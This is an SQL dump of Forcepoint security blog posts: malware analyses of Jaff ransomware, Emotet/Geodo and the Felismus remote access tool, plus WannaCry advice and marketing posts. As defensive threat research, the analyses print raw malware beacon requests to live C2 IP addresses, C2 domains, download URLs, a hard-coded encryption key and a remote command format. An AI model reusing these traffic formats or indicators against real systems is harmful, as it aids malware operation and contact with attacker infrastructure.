of WannaCry distribution, both for this campaign and any possible future campaigns.\n \n\nRecommendations\n\nEnsure that the MS17-010 security update is installed on all Windows machines within the organisation.\n	Ensure that you have email and web security that can block malicious emails, block intermediate download stages with Real Time Security Signatures (RTSS), and provide URL wrapping for additional protection.\n	In line with Microsoft\'s guidance from 2016 [2], customers should consider disabling SMBv1 and other legacy protocols on all Windows systems [3] where this will not negatively impact the function of legacy systems within the environment. If you are a Forcepoint customer please consult the following Knowledge Base Article to identify what course of action may be suitable for your product: https://support.forcepoint.com/KBArticle?id=000012832\nFor the time being, it may additionally be desirable to ensure that the \'kill-switch\' domains are not blocked within your organisation in order to stop propagation of the malware. However, as with any whitelist entry, this should only be employed for long enough to ensure that other, more permanent protections are in place.\n\nFor additional general guidance on ransomware, please visit https://www.forcepoint.com/ransomware.\n\nForcepoint customers can find product-specific guidance on ensuring their protection in the following Knowledge Base articles:\n\nWeb https://support.forcepoint.com/KBArticle?id=Protecting-your-organization-against-WannaCryptor-ransomware\n	Email https://support.forcepoint.com/KBArticle?id=Protecting-email-from-WannaCry-worm\n	NGFW https://support.forcepoint.com/KBArticle?id=Blocking-Wannacry-in-Forcepoint-NGFW\nReferences\n\n[1] https://blockchain.info/address/13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\n\n[2] https://blogs.technet.microsoft.com/filecab/2016/09/16/stop-using-smb1/\n\n[3] https://support.microsoft.com/en-us/help/2696547/how-to-enable-and-disable-smbv1,-smbv2,-and-smbv3-in-windows-vista,-windows-server-2008,-windows-7,-windows-server-2008-r2,-windows-8,-and-windows-server-2012', 'https://www.forcepoint.com/blog/security-labs/wannacry-ransomware-worm-targets-unpatched-systems\n');

A complete list of these is provided at the end of this blog. It is capable of offline encryption without dependency on a command and control server. Once a file is encrypted, the \'.jaff\' file extension is appended.\n\nIn every affected folder, the ransom notes \'ReadMe.bmp\', \'ReadMe.html\' and \'ReadMe.txt\' are dropped while the desktop background of the infected system is also replaced. All of these components contain a message similar to the following:\n\n\n\nMeanwhile, there are a few indicators of a possible association between Jaff and the infamous Locky ransomware. For starters, both Jaff and Locky are spread by the Necurs botnet. Additionally, The Tor-based payment sites for both families resemble each other:\n\n\n\n \n\n\n\nWhile the code behind Jaff is less sophisticated than Locky\'s, it attempts to delete itself if the local language of the machine is \'LANG_RUSSIAN\' (0x19). Locky is known to implement a similar filtering:\n\n\n\nFinally, Jaff attempts to connect to the C2 server fkksjobnn43[.]org which is hardcoded in its code. This is a known Locky domain.\n\n\n\nProtection statement\n\nForcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.\nStage 5 (Dropper File) - Jaff variants are prevented from being downloaded.\nStage 6 (Call Home) - Attempts by Jaff to contact its C&C server are blocked.\n\nConclusion\n\nIt\'s easy to be dismissive of broad-reach email campaigns such as this and focus on the more \'glamorous\' world of spearphishing. The emails sent by this campaign may look spartan to the professional eye but, as ever, the human point is the weak point: by potentially reaching so many people, campaigns such as this can - and do - succeed in infecting people.\n\nThis broad scope, coupled with low antivirus detection rates at the time of the campaign, once again highlights the necessity of defence-in-depth.\n\nAt the time of writing it is unclear if Jaff\'s links with Locky extend beyond the visual structure of the URLs and documents employed. What is clear, given the volume of messages sent, is that the actors behind the campaign have expended significant resources on making such a grand entrance. With the high ransom value suggesting the perpetrators of this campaign intend to recoup their costs, it would be surprising if Jaff fades from the limelight as suddenly.\n\nIndicators of Compromise\n\nHashes\n\n\nNm.pdf\nSHA256  5722daf5c0b91363808d46a2c5b93a8f70f0dadd94866148d1d77975ba04d211\nSHA1    f98a35ab5f9fa47a49db5535b654cebb5bc99bf5\n\n\nJaff ransomware\nSHA256  0746594fc3e49975d3d94bac8e80c0cdaa96d90ede3b271e6f372f55b20bac2f\nSHA1    8ab568db2bc914e3e6af048666eb0bc4ba2e414d\n\nDownload URLs\n\n\nhxxp://takanashi[.]jp/f87346b\nhxxp://babil117[.]com/f87346b\nhxxp://easysupport[.]us/f87346b\nhxxp://julian-g[.]ro/f87346b\nhxxp://phinamco[.]com/f87346b\nhxxp://techno-kar[.]ru/f87346b\nhxxp://tiskr[.]com/f87346b \nhxxp://trans-atm[.]com/f87346b\nhxxp://trialinsider[.]com/f87346b \nhxxp://wipersdirect[.]com/f87346b\n\nTargeted file extensions\n\n\n.xlsx .acd .pdf .pfx .crt .der .cad .dwg .MPEG .rar .veg .zip .txt .jpg .doc .wbk .mdb .vcf .docx .ics .vsc .mdf .dsr .mdi .msg .xls .ppt .pps .obd .mpd .dot .xlt .pot .obt .htm .html .mix .pub .vsd .png .ico .rtf .odt .3dm .3ds .dxf .max .obj .7z .cbr .deb .gz .rpm .sitx .tar .tar.gz .zipx .aif .iff .m3u .m4a .mid .key .vib .stl .psd .ova .xmod .wda .prn .zpf .swm .xml .xlsm .par .tib .waw .001 .002 003. .004 .005 .006 .007 .008 .009 .010 .contact .dbx .jnt .mapimail .oab .ods .ppsm .pptm .prf .pst .wab .1cd .3g2 .7ZIP .accdb .aoi .asf .asp. aspx .asx .avi .bak .cer .cfg .class .config .css .csv .db .dds .fif .flv .idx .js .kwm .laccdb .idf .lit .mbx .md .mlb .mov .mp3 .mp4 .mpg .pages .php .pwm .rm .safe .sav .save .sql .srt .swf .thm .vob .wav .wma .wmv .xlsb .aac .ai .arw .c .cdr .cls .cpi .cpp .cs .db3 .docm .dotm .dotx .drw .dxb .eps .fla .flac .fxg .java .m .m4v .pcd .pct .pl .potm .potx .ppam .ppsx .ps .pspimage .r3d .rw2 .sldm .sldx .svg .tga .wps .xla .xlam .xlm .xltm .xltx .xlw .act .adp .al .bkp .blend .cdf .cdx .cgm .cr2 .dac .dbf .dcr .ddd .design .dtd .fdb .fff .fpx .h .iif .indd .jpeg .mos .nd .nsd .nsf .nsg .nsh .odc .odp .oil .pas .pat .pef .ptx .qbb .qbm .sas7bdat .say .st4 .st6 .stc .sxc .sxw .tlg .wad .xlk .aiff .bin .bmp .cmt .dat .dit .edb .flvv .gif .groups .hdd .hpp .log .m2ts .m4p .mkv .ndf .nvram .ogg .ost .pab .pdb .pif .qed .qcow .qcow2 .rvt .st7 .stm .vbox .vdi .vhd .vhdx .vmdk .vmsd .vmx .vmxf .3fr .3pr .ab4 .accde .accdt .ach .acr .adb .srw .st5 .st8 .std .sti .stw .stx .sxd .sxg .sxi .sxm .tex .wallet .wb2 .wpd .x11 .x3f .xis .ycbcra .qbw .qbx .qby .raf .rat .raw .rdb rwl .rwz .s3db .sd0 .sda .sdf .sqlite .sqlite3 .sqlitedb .sr .srf .oth .otp .ots .ott .p12 .p7b .p7c .pdd .pem .plus_muhd .plc .pptx .psafe3 .py .qba .qbr.myd .ndd .nef .nk .nop .nrw .ns2 .ns3 .ns4 .nwb .nx2 .nxl .nyf .odb .odf .odg .odm .ord .otg .ibz .iiq .incpas .jpe .kc2 .kdbx .kdc .kpdx .lua .mdc .mef .mfw .mmw .mny .moneywell .mrw.des .dgc .djvu .dng .drf .dxg .eml .erbsql .erd .exf .ffd .fh .fhd .gray .grey .gry .hbk .ibank .ibd .cdr4 .cdr5 .cdr6 .cdrw .ce1 .ce2 .cib .craw .crw .csh .csl .db_journal .dc2 .dcs .ddoc .ddrw .ads .agdl .ait .apj .asm .awg .back .backup .backupdb .bank .bay .bdb .bgt .bik .bpw .cdr3 .as4\n\nNote: This page was edited on 11-May-2017 to correct an error in a mentioned C2 URL.', 'https://www.forcepoint.com/blog/security-labs/jaff-enters-ransomware-scene-locky-style\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (90, 'Guardians of the Cyber Galaxy', 'Virginia SatromSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'Guardians of the Galaxy Vol. 2 premiered last week and if you’re a huge Chris Pratt fan like me, you’ve been waiting for this for a while. The Guardians’ movie series focuses around unlikely heroes protecting the galaxy and unifying to – you guessed it – guard the galaxy. This got us thinking. While it might not be inherently obvious, if you take a look at the overall theme of the movies you can draw a parallel to an effective cybersecurity organization. Many of the best organizations and teams draw on different types of people to be stronger together. Now, we don’t consider ourselves a band of misfits, but we definitely work together to guard the cyber galaxy. What follows are a few key teams in particular that work to ensure our customers and partners are safer than they were the day before with some light-hearted Guardians of the Galaxy parallels.\n\n\n\n	Forcepoint Security Labs™\n	First, our Forcepoint Security Labs team brings together researchers, engineers, analysts and thought leaders from around the world. They discover, investigate, report and – ultimately – protect our users from sophisticated, evasive and evolving Web- and email-based threats. They do so by understanding the behavior and intent of the external attackers and malicious, accidental and compromised insiders alike. We like to think of them as our Rocket Raccoon and Groot duo. The former has the cunning and technical skills for any challenge The Guardians face while Groot often provides the pure strength for such challenges. As the movie portrays, they are mercenaries that deal with criminals in order to make a living or claim a bounty. Our Security Labs team investigates cybercriminals in order to shed light on the most prevalent attacks or sneaky social engineering techniques that enticed employees to click a malicious email and become compromised insiders. They have reverse engineered Locky, reported on the gamification of DDoS via their Sledgehammer Report and most recently uncovered ransomware that was targeting the healthcare industry. This team works every day to identity and analyze the latest threats to our cyber galaxy and raise the profile of security in our customers’ organizations. We spoke with Principal Security Analyst Carl Leonard from this team and he had the following to say: “Change is guaranteed. The cybersecurity field is still maturing and mistakes continue to be made by businesses and implementers. Understanding why that is and how we as a community can do better is fun. We are truly on the cutting edge.” With this team, we can ensure that we are can keep up with a landscape that changes by the minute.\n\n\n\n	Office of the CSO & CTO\n	Whether you are creating a new security strategy for your company or agency, assessing or improving your existing security program across the cyber continuum of intent, or even actively under attack, the Office of the CSO/CTO supports you at every step. Each of our experts brings to bear experience to address an organization’s needs, comprising over a century of experience in security. We like to think of this team as our Gamora: with tactical first-hand experience and a well-rounded skill set, they are unstoppable when it comes to information. In fact, some of these folks are former CISOs themselves, so they have the highest-level of preparedness to understand any challenge you may face as your users interact with critical business data and intellectual property. We asked Deputy CISO Neil Thacker what keeps him in his role and in the security industry:“The challenge. It’s everyday 24/7. Keeping up with threats, focusing on education for employees, juggling with governance, risk, compliance and communicating business risk to support the success of the organization. I have signed up for the challenge and still enjoy the variety the role offers, 20 years in.” This team acts as trusted advisors both internally and externally to ensure we are assessing all aspects of the risk we face wherever our data resides.\n\n\n\n	Product Security Team\n	Next, we focus on a team that ensures our systems are truly intelligent to protect the human point: where data is most valuable and vulnerable. Forcepoint’s Product Security Team performs product security testing prior to release and throughout product lifecycles. They also provide internal teams with security evangelism, such as consulting and the development of standards. To support the development of threat-resistant products, our Trust Program provides rapid incident response to vulnerabilities by positively engaging the security community and executing efficient processes to ensure a consistent and timely approach to remediating vulnerabilities. We like to think of this team as our Drax the Destroyer. Drax is known for his resilience and strength in the pursuit of a singular goal: to defeat Thanos, the biggest threat to peace. We draw this parallel to our Product Security Team based on their tireless pursuit of one goal: ensuring that our products are resilient and the best products in the galaxy. We chatted with Peter Morin who leads this team and he spoke about protecting organizations and their end users: “Our team interfaces with internal and external sources, ensuring everything is working the way it should at the point where data is most valuable and vulnerable. We have programs set-up in order to test our products before they are released, test on an ongoing basis and provide an easily accessible way to submit potential vulnerabilities.” With the Product Security Team, we round out our holistic approach to ensure we have the right people and intelligent systems integrating seamlessly to protect the cyber galaxy.\n\n\n\n	Executive Team\n	So, we have the expert teams and the tech – let’s not forget about the leadership that brings us all together. Our fearless leaders, who we could consider (as a collective) the Star-Lord of our teams in this scenario, really live and breathe our vision. As Forcepoint CEO Matt Moynahan said at RSA Conference: “Security has never been more important and risks have never been more dire, but we as an industry are meeting their needs less and less.” This is why Matt is so focused on what he calls subverting the dominant paradigm in our industry, by looking at intent and motivations of users. He is passionate that we have never had a greater opportunity as an industry to make an impact on safeguarding critical data and IP. With the ability to bring together all of the above teams, recognizing that each team in a silo cannot be as effective without one another, our executive team brings the passion to make us successful at combating threats.\n\n\n\n	Though we might not actually have superheroes Drax, Gamora, Groot, Rocket, or Star-Lord in our midst, we are proud to stop the bad and free the good. With all of these teams working together, we are more effective in defending our customers and ultimately the cyber galaxy we are entrusted to protect.', 'https://www.forcepoint.com/blog/insights/guardians-cyber-galaxy\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (91, 'New variant of Geodo/Emotet banking malware targets UK', 'Luke SomervilleJohn BergbomForcepoint Security Lab', '\n      \n    \n      \n      \n   ', 'Forcepoint Security Labs have recently observed a malicious email campaign delivering what appears to be a new variant of the Geodo/Emotet banking malware, predominantly to .UK TLDs across a range of sectors including addresses at major business and government departments.\n\nSeveral prior campaigns have been recorded with researchers noting a progressive evolution in the methods employed by the actors behind the malware: earlier versions were reported delivering the malware as an attachment to fake telephone bills. This then changed to embedding links to malicious files within the emails - the same approach as has been observed in this campaign.\n\nA Note on Naming\n\nWhen the sample analysed in this blog post was discovered it triggered two antivirus signatures identifying it as Emotet - another name for the Geodo malware. Geodo has a lengthy and somewhat complex family tree: Geodo itself was a development of Feodo (AKA Cridex; Bugat) and subsequent variants of Geodo were generally referred to as Dridex. A more complete history is available here: https://feodotracker.abuse.ch/ \n\nBoth the malicious email campaign and the malware sample discussed in this post are distinct from the recent Dridex campaigns and bear far more similarity to the older Emotet/Geodo variant. The name Geodo will be used in preference to Emotet throughout the remainder of this post to align with previous Forcepoint Security Labs naming [1] [2].\n\nDelivery\n\nThe campaign appeared to peak on 18 April 2017 and primarily targeted email addresses associated with .UK TLDs. The subject line of the emails sent varied slightly but the content took the form of a fake billing notification emails. Similar to previously recorded Geodo campaigns this email was formatted using images hosted on the legitimate websites of the companies mimicked. Note the use of what would for most people be an abnormally high billing amount (presumably to further entice the reader to try and \'view the bill\') and the inclusion of an overt reference to the link\'s target being a JS file (presumably to reassure the user about the format of the file returned if they do follow the link).\n\n\n\n\n\nWhile the link in the second excerpt shown above purports to be hosted on the website of the provider being mimicked, in reality the link leads to a path on a compromised domain (in this case natchezms[.]us). This underlying link does indeed return a .JS file, heavily obfuscated and apparently seeded with large amounts of \'junk\' data:\n\n\n\nWhen run, the next thing the user sees is an error message (shown below).\n\n\n\nUpon clicking \'OK\' the malware commences its attempts to beacon to its C2 server, where the differences between previous versions and this one become more apparent.\n\nEarlier versions would send an HTTP POST request containing encrypted data to port 8080 on one of a list of C2 IP addresses. This POST request would be made to a path on the server derived from information about the victim and the malware itself (see below). As previously documented elsewhere [3], the malware would also deliberately call out to incorrect C2 IP addresses if it detected that it was running in a virtual machine.\n\n\nHTTP Request to C2 (Old Method)\n\nPOST /722ffc5e/355c7a0a/ HTTP/1.1\nAccept: /\nUser-Agent: Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)\nHOST: 103.215.153.151:8080\nContent-Length: 207\nConnection: Keep-Alive\nCache-Control: no-cache\n\nThe variant recorded during this campaign uses a markedly different communications method. While it still makes HTTP requests to port 8080 on its C2 IP, this takes the form of a GET request with what is presumably its identification data encrypted within a Base64-encoded Cookie string:\n\n\nTCP Stream One: HTTP Request to C2 (New Method)\n\nGET / HTTP/1.1\nCookie: 2324=OpPJoy3z54sAJDD/VcfK6Y60NGclE42VSCItJVZ21v0ePBoQnDGSQqX791ltGL6Dxi26BLoxb6T\nU4t1hPl63fi4SdTrf+fda9M++o0WzZ/ZCPkVEYkOQ5fYay8QeA/wmfz48ribJFoB6VZmrJuNl9FwiR80UYThs6hQ\nZkqlw8R8JNxJ9tiAnsi3aLeHubIwPFmEc4FmwWn8ecRMKk5eu9nT/ZtHk+U9sjkaN+Lesa9wgReHkyGO+pG0HHxx\nm8W0bameGkuJXH96EfYvPy96mQc+AK577QRsodi6eNTKw4/TX2DOL79ZfGY0K90EcMJMEnAI5CWyrQa5DIAXGUXL\nhsGRfHDZ9dViuiZSo6ycG8ytyMRuRt3uJRN9AluL6LMckWoNFCx4iW2qAomvrL6yEvB9M+qkXxg16vdegS034LkX\nQT8nxkUzbEydEz3SY0REYmeejvVE7wLY03CTORnmmCAKf67uaP+l/ze9GqfHI9WCLya+HfF9ovtdyh/iaWNJ8Dsb\nlh+oiX46I1MTFp3/nNKKJfH5yBGih4r0nHxQFldBO9KvgRSuhR9i1X6jC31Goa+sY7fG9xrBuSHUs7eUl7/BsV2Y\nAAVri5shK64R/a/apvOkiyOUchhwATJg6dBakgod85T2yfZqO6PGInEJF/UIfTOXVahQIoFzjBtyxcY+HBh6aeth\n4Jdd77u7Ui37lIJ4VnVaIsaH+W7l82Tn1f2ijlrg=\nUser-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)\nHost: 212.83.166.45:8080\nConnection: Keep-Alive\nCache-Control: no-cache\n\nNote: Line breaks have been added within the communications strings for formatting purposes.\n\nWhen the malware was successfully run the remote IP address (212.83.166.45 - AS12876; ONLINE S.A.S., FR)  responded with a 404 error header and a significant amount of encrypted data (note the Content-Length value):\n\n\nTCP Stream One: C2 Response (Header Only)\n\nHTTP/1.1 404 Not Found\nServer: nginx\nDate: Thu, 20 Apr 2017 08:27:32 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 261780\nConnection: keep-alive\n\nA second request/response is then seen between the victim and the same C2.

Today, we’re taking it even further, announcing our new Forcepoint Advanced Malware Detection (AMD) cloud service alongside the new NGFW 6.2 release of our unified software for firewalls and intrusion prevention systems (IPS). They’re both extremely easy to roll out: AMD is in the cloud already and NGFW 6.2 can be downloaded from the Forcepoint support portal and deployed in minutes via our NGFW Security Management Center.\n\n\n	AMD uses the industry’s leading sandboxing and dynamic behavioral analysis technology to uncover Zero-Day attacks and other advanced threats hidden in files as they are sent through your network. Operating from the cloud, it complements the file reputation and malware scanning that are built into our NGFW and can be enabled across your Forcepoint firewalls without having to touch individual devices:\n\n\n	\n\n\n	 \n\n\n	Forcepoint NGFW Combines Multiple Techniques to Uncover Advanced Malware\n\n\n	Together, AMD and our NGFWs provide a very efficient and effective way to spot malicious code and rapidly block it, before attackers can breach your network and begin stealing data. But, AMD is more than just a powerful addition to our firewall solutions. It will also be used by Forcepoint’s Web Security, Email Security and CASB (Cloud Access Security Broker) in the coming months, making us the first vendor to offer seamless protection against advanced threats across network, web, email and application access.\n\n\n	This multichannel approach can significantly accelerate your response to attacks. Malware spotted on one path into your organization can immediately be blocked on other paths, which is particularly valuable when you have users working remotely. Remember, the bad guys almost always attack along multiple vectors (think how phishing emails drive people to the web for unwanted downloads); you need to guard all of your channels consistently to keep your enterprise protected.\n\n\n	AMD and NGFW also give network and security administrators a powerful new tool for understanding malicious code, providing insights that will help them stop bad cyber practices and encourage good employee behaviors.\n\n\n	\n\n\n	 \n\n\n	Giving Admins Insights into the Behaviors of Malicious Code\n\n\n	NGFW 6.2 Adds Other Enhancements\n\n\n	The NGFW 6.2 release also extends Forcepoint’s firewall and IPS capabilities in other ways that partners and customers have asked for:\n\n\n		Expanded offerings for MSPs – Managed Service Providers now can offer mission-critical application protection to their clients (whether internally within an enterprise or externally across multiple organizations) with Forcepoint’s unique Sidewinder Security Proxies for SSH/SFTP, HTTP, TCP and UDP – even in networks with overlapping IP ranges. This enables our MSP partners to provide a level of security that their competitors can’t match.\n	\n		Automation of policy change management – organizations can boost efficiency and make auditors happier with policy change approvals built right into SMC. This eliminates the need for manual processes and makes it easy to comply with mandates for 2-person approval and archiving of all policy changes.\n	\n		Deeper, faster control of encrypted traffic – administrators now have fine-grained control over the rapidly growing volume of encrypted traffic into and out of their networks, with high-performance inspection of HTTPS connections, command-level control of SSH/SFTP applications, and dynamic enforcement of user privacy mandates.\n	\n		Automated scalability in virtualized data centers – operations and security teams can automatically provision and control hundreds or thousands of virtual firewalls in VMware NSX environments with our support for Open Security Controller (OSC). Now, their security can elastically scale along with their applications.\n	\n		More than a dozen workflow enhancements – IT personnel can even more efficiently deploy, investigate and remediate firewalls and IPSs across their network with numerous automation and user experience improvements in the SMC.\n\n	Learn more about our NGFW software, what customers are saying about it, and what makes it different here.', 'https://www.forcepoint.com/blog/insights/next-gen-firewalls-advanced-malware-detection-cloud-better-zero-day-protection-and\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (94, 'Playing cat & mouse: introducing the Felismus malware', 'John BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'The primary samples examined appear in the wild with filenames mimicking that of Adobe\'s Content Management System [1] and offers a range of commands typical of Remote Access Tools: file upload, file download, file execution, and command execution.\n\nAnalysis shows the malware overall to be modular, well-written, and to go to great lengths to hinder both analysis efforts and the content of its communications. Its apparent scarcity in the wild implies that it is likely highly targeted. Furthermore, as discussed in this analysis, the good \'operational hygiene\' relating to the re-use of email addresses and other similarly traceable artefacts similarly suggests the work of coordinated professionals.\n\nAt the time of writing, both the actors behind the malware and their ultimate intentions remain opaque, but it seems likely that the samples discovered are the \'thin end of the wedge\' as far as this campaign is concerned. Forcepoint Labs have named the samples \'Felismus\' in reference to the \'Tom & Jerry\' encryption key used by the malware.\n\nKey findings\n\nIn instances where the original filename is known, the malware appears in the wild as \'AdobeCMS.exe\';\n	The malware appears to be modular and capable of self-updating;\n	Samples analysed appear to attempt to identify and avoid a large number of AV products;\n	Executables and DLLs appear to be written to hamper analysis/reverse engineering efforts;\n	Majority of messages to and from C2 infrastructure are encrypted twice with differing keys;\n	Many identifiers within the malware (e.g. victim IDs, module IDs, encryption keys) derived from MD5 hashes of other components;\n	One human-readable encryption key identified: \'Tom&Jerry@14here\';\n	C2 infrastructure is active and, at the time of writing, appears to be maintained;\n	Threat actors and end-targets remain unidentified at this time.\nAnalysis\n\nAt the time of discovery, the initial sample (SHA256: e48822e0c5ceae5377100053047e78f015b1ec2372f349eaa9e98f25ba33e4da) had a relatively low detection rate of 9/60 on VirusTotal, triggering only generic/heuristic signatures. Pivoting on various features of this sample revealed a number of additional samples, shown below.\n\n\n\nAll three of these samples drop the following two DLL files:\n\n\n\nThese two DLL files export a number of functions:\n\n\n\nNote the mis-spelling present in the \'GetCurrtenUserName\' function exported by converts.dll.\n\nWhen run, all of the samples create an invisible window and register a WindowProc function to it. This function contains the main functionality of the malware, with the original process sending messages to the invisible window in order to execute the following capabilities:\n\nDownload a file from a remote server\n	Create a text file on the local machine\n	Execute a file\n	Execute a shell (cmd.exe) command and save the results to disk\n	Upload the results of a previously executed shell command to a remote server\nThe samples examined check for a large number of processes associated with antivirus vendors. The complete list is show below.\n\n\n\nWhile most of these are globally-known vendors, two stand out as less common: Rising AntiVirus [2] is a Chinese vendor of AV and security products with limited presence outside of China (indeed, they discontinued their English-language website in 2013), and VirusChaser [3] is a Korean vendor with a similarly narrow regional presence.\n\nNetwork Traffic\n\nUpon execution, the malware makes a series of innocuous looking HTTP requests to www[]cosecman[]com seemingly designed to look like normal browsing/shopping activity:\n\n\n(i)   GET /notice/news/items.php?V=ca09a22378d1673b&U= HTTP/1.1\n\n\n(ii)  GET /notice/news/items.php?V=ca09a22378d1673b&M=f871ff6f939cecf8&U=fe41320b0e4c5d1a\n\n\n(iii) POST /notice/items/products.php?mobfhvkaqmrmsjjalllpdtkizewqx\n\nAnalysis of these requests and their associated responses show them to be part of the malware\'s setup process. The \'V\' argument passed by the malware in requests (i) and (ii) is encrypted and hard-coded within the three samples discovered. This suggests that it provides a relatively consistent identifier (e.g. campaign or software version) to the C2 server.\n\n\n\nThe server responds to request (i) with an encrypted string and, within the HTTP headers, an ETag value which is used as the filename of an empty text file. This filename is used to define the victim\'s machine ID for future communications with the C2 and later as part of an encryption algorithm; if a file with a name matching the format of the ETag already exists, it uses the existing filename rather than replacing it.\n\nNote: The encryption methods employed vary significantly and are discussed in greater depth later in this article.\n\nThe machine name is defined by generating the MD5 of the ETag and taking only the \'middle\' 16 hex digits of this value, e.g. a machine sent ETag \'{C599BA7D-A7D0-2846-6005-39A8D50A835E}\' would generate an MD5 of \'46ea3fa21a69890650089f1c0d4e7170\' and use the identifier \'1a69890650089f1c\' in future communications.\n\nThe encrypted string returned in the body of the response decrypts to the \'converts.dll:f871ff6f939cecf8\\r\\n\'. This comprises the filename of the module to be downloaded and the middle 16 hex digits of the MD5 of converts.dll (e326f756f871ff6f939cecf898d84100). This is included as the \'M\' argument passed by request (ii), with the machine ID generated from the filename defined by the ETag being passed as the \'U\' argument.\n\nThe converts.dll file is returned by the C2 in response to request (ii).\n\n\n\nRequest (iii) POSTs a message code (see below), the ETag-generated machine name, and selection of system information to the C2 in the form of an encoded, encrypted string. A decrypted example of the system information returned is shown below. The argument supplied to the products.php page (e.g. ?mobfhvkaqmrmsjjalllpdtkizewqx) appears to be randomly generated by a string function within the code.\n\n\n\nAt the time of writing, the only observed response to these POST requests is FUez9JqjgAGdO+jPAj5EnA== which simply decrypts to \'OK\' and functions as a \'noop\' command to the malware.\n\nInterestingly, analysis of the malware shows that its initial check upon receiving this response is the length of the decrypted string: it assumes any two character string to be \'OK\'. Longer responses - i.e. commands being sent to the malware - are expected to be in the format \'[commandid]#[arguments]\' - e.g. \'110#ipconfig\'.\n\nThe tables below show the command and message codes identified to date:\n\n\n\nEncryption methods\n\nThe malware uses at least three separate encryption methods for its traffic, depending on the type of message. The first method, implemented within HTTPDLL.dll, is used for the decryption of values and traffic relating to the HTTP GET requests (i) and (ii) discussed above. It appears to use an implementation of AES to encrypt the data which is then transmitted in its encrypted format. The key (shown in the image below) is apparently static, at least among the samples tested, and generated by drawing byte values from multiple parts of the binary and performing a number of bitwise operations on them.\n\n\n\nRequest (iii) itself uses a more complex variant: the cleartext data to be transmitted is AES encrypted using the first 16 hex digits of the MD5 of the ETag filename as a key and then converted to base64. A response code and the machine ID (the \'U\' argument seen in request (ii) - is prepended to this in plain text and the whole string is then encrypted and base64 encoded again with the \'Tom&Jerry@14here\' key shown below.\n\nThis method is then used for all C2<->Malware communications (e.g. commands, command responses, etc.) except for the straightforward OK/noop response.\n\nDecryption for the OK/noop response is implemented within converts.dll and uses the hard-coded key \'Tom&Jerry@14here\' before converting the result to base64 for transmission. It is unclear why these messages alone use this single-wrapped approach.\n\n\n\nDisk activity & log files\n\nThe samples identified dropped the following files to %APPDATA%/Roaming/Microsoft/Security/ when run:\n\n\n\nThe file named \'data\' appears to be used to store the encrypted value returned by the C2 in response to the first HTTP GET request the malware makes.\n\nThe log files generated by the malware consist only of ISO-format date/time stamps and a three letter log code. Only six unique log codes could be generated during sandboxing:\n\n\n\nThe meaning of these log entries is shown in the table below.\n\n\n\nCosecman & associated domains\n\nVisiting cosecman[]com reveals what appears to be a copy of the WordPress.org website, albeit with a stylesheet error in all browsers tested.\n\n\n\nThis error may be a result of files having moved and/or XSS protection present on the \'real\' WordPress.org website, as an inspection of the source code of the page shows it to be \'leeching\' the majority of the content from the WordPress.org domain.\n\n\n\nBased on the download link and blog post referenced on the page referring to WordPress v3.5.1, the source code was likely captured in January 2013 [4].\n\nAt the time of writing, the cosecman[]com domain has been recorded on three IP addresses:\n\n\n\nHistorical DNS data for these IP addresses shows that a number of additional domains have moved IP address in close-step with cosecman[]com since 2016, all of which return the fake WordPress.org page from 2013 detailed above. Registrant details of these, along with cosecman[]com, are shown below.\n\n\n\nAll of the details associated with these domains are falsified: the Hong Kong-based telephone numbers are invalid, and the associated street addresses nonexistent. Further to this, the email addresses used to register the domains do not seem to have been used to register any other domains or, indeed, anywhere else online. If the domains are assumed to be related to the same actors and/or campaign based on the close registration timestamps and circumstantial evidence available, this suggests a degree of professionalism and good \'operational hygiene\'.\n\nAs of 28 March 2017, three other IP addresses within AS132883 serve the same fake WordPress.org page when sent an HTTP GET request: 103.43.18.102, 103.43.18.106, and 103.43.18.111. \n\nOf these three, IP address 103.43.18.106 does not appear to be associated with any domains at the time of writing. IP address 103.43.18.102 appears to host a number of additional domains registered with similar fake details to those above:\n\n\n\nUnlike the email addresses used to register cosecman[]com and the domains hosted alongside it, all three of these email addresses appear to have been associated with other domains, specifically: kasparcloud[]com (KactsKuang@mail.com); mixtun[]com (kaka.chong@aol.co.uk); and canshone[]com (ThomasMatany@email.com). All three of these older domains appear to have expired in early June 2016, with DNS records suggesting that they were active between October 2015 and April 2016.\n\nIP 103.43.18.111 is host to the domain qqhodo[]com. This domain differs from the others in that it both appears to have been registered via a domain privacy service instead of using fake credentials and to have hosted content previously indexed by Google:\n\n\n\nWhile the relationship between these IP addresses and domains remains unclear, it can be stated that other IP addresses within the same subnet do not appear to return the fake WordPress.org page. Furthermore, the E-Tag and content last modified dates for all four of the IP addresses identified within the 103.43.18.0/24 subnet are identical, raising the possibility that the IP addresses simply function as reverse proxies for incoming connections, with the \'real\' C2 server located elsewhere.\n\nProtection statement\n\nForcepoint customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 5 (Dropper File) - The malware components are prevented from being downloaded and/or executed.\n\nStage 6 (Call Home) - The HTTP-based C2 traffic is blocked.\n\nConclusion\n\nThe malware analysed appears to be both modular and well-written, strongly suggesting that skilled attackers are responsible, while its apparent scarcity in the wild implies that it is likely highly targeted. On top of this, as observed above, the good \'operational hygiene\' relating to the re-use of email addresses and other similarly traceable artefacts suggests coordinated, professional actors and, at the time of writing, there is little to link it with any known campaigns (APT-linked or otherwise).\n\nThe unusual use of the folder name \'datas\' and the apparent typo in the function name \'GetCurrtenUserName\' stand out. While the latter kind of error is not necessarily unusual in malware samples, it does stand out in what is otherwise a well-written piece of software. The \'datas\' folder, on the other hand, may be more revealing in that it suggests that English may not be the authors\' first language. It is also potentially worthy of note that all of the samples appear to have been compiled using a version of the open-source TDM-GCC compiler suite [5] dating from December 2014.\n\nBehaviourally, it is unclear whether the malware\'s \'resistance\' to performing its additional functions (as evidenced by the small number of unique log file entries which could be generated) is a result of the campaign now being dormant or of there being a selectivity about the machines to which the C2 will send further instructions. It is worth noting at this point that the C2 IP address associated with the cosecman[]com domain appeared to selectively block one of our exit IPs during our 